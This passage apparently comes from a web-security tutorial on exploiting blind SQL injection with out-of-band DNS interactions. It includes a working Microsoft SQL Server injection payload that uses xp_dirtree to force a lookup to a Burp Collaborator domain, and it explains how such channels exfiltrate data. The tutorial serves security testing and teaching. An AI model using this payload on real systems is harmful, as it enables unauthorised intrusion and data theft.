 In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems. 



The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:

`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`

This causes the database to perform a lookup for the following domain:

`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

You can use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.

Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.
